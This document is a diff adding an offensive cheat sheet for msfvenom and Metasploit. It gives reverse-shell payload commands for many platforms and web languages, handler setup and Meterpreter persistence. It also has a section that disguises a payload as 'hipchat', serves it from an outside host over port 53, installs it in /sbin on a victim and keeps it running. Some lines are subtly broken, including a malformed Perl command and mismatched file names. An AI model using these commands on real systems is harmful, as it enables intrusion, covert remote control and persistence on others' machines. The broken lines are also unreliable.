@@ -1,0 +1,126 @@
+C0nn3ctz msfvenom payload backdoor veil
+
+List payloads
+msfvenom -l
+
+# The script way to make life more simple
+theip=0.0.0.0
+theport=443
+
+
+Binaries and libs
+=================
+
+Linux
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$theip LPORT=$theport -f elf > shell.elf
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=$theip LPORT=$theport -f elf > shell.elf
+
+Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$theip LPORT=$theport -f exe > shell.exe
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$theip LPORT=$theport -f exe -o shell.exe  # STAGED, use this with msf
+msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=$theip LPORT=$theport -f exe -o shell.exe  # NON-STAGED
+msfvenom -p windows/x64/exec cmd="cmd /c calc.exe" -f dll > d3d9.dll
+msfvenom -p windows/exec CMD="cmd /c calc.exe" -f dll > d3d9.dll
+msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=$theip LPORT=$theport
+
+Mac
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=$theip LPORT=$theport -f macho > shell.macho
+
+
+
+Web Payloads
+============
+
+PHP
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$theip LPORT=$theport -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$theip LPORT=$theport -f asp > shell.asp
+
+JSP
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$theip LPORT=$theport -f raw > shell.jsp
+
+WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$theip LPORT=$theport -f war > shell.war
+
+JavaScript
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=1 -f js_le
+
+
+
+Scripting Payloads
+==================
+
+Python
+msfvenom -p cmd/unix/reverse_python LHOST=$theip LPORT=$theport -f raw > shell.py
+
+Bash
+msfvenom -p cmd/unix/reverse_bash LHOST=$theip LPORT=$theport -f raw > shell.sh
+
+Perl
+msfvenom -p cmd/unix/reverse_perl LHOST=$theip LPORT=$theport -f raw > shell.pl  # For Linux
+msfvenom -p cmd/windows/reverse_perl=$theip LPORT=$theport -f raw > shell.pl  # For Windows
+
+
+
+Shellcode
+=========
+
+For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
+
+Linux Based Shellcode
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$theip LPORT=$theport -f <language>
+
+Windows Based Shellcode
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$theip LPORT=$theport -f <language>
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=443 -f c
+msfvenom -p windows/shell/bind_tcp -f perl --smallest  # Default port is 4444 and with --smallest msfvenom tries to make it small 
+
+Mac Based Shellcode
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=$theip LPORT=$theport -f <language>
+
+
+
+Handler
+=======
+
+Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
+
+use exploit/multi/handler
+set PAYLOAD cmd/windows/powershell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 443
+set ExitOnSession false
+exploit -j -z
+
+Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘
+
+
+
+Persistence
+===========
+meterpreter > run persistence 
+
+
+
+UUID Payload
+============
+
+# Create payload
+msfvenom -p linux/x86/meterpreter/reverse_tcp_uuid LHOST=domainzz.com  LPORT=53 PayloadUUIDTracking=true PayloadUUIDName=HAXHAXHAXHAX -f elf > hipchat
+
+# Setup msf listener
+set payload linux/x86/meterpreter/reverse_tcp_uuid
+set payloadUUIDName HAXHAXHAXHAX
+set PayloadUUIDTracking true
+run -j 
+
+# Move to vict
+cat hipchat.elf |ncat --ssl -lvp 53
+nc --ssl domainzz.com 53 > /sbin/lister
+chmod +x /sbin/lister
+
+# crontab alternatively:
+if ps aux|grep /sbin/hipchat |grep -v grep; then sleep 1 ; else /sbin/hipchat ; fi
+
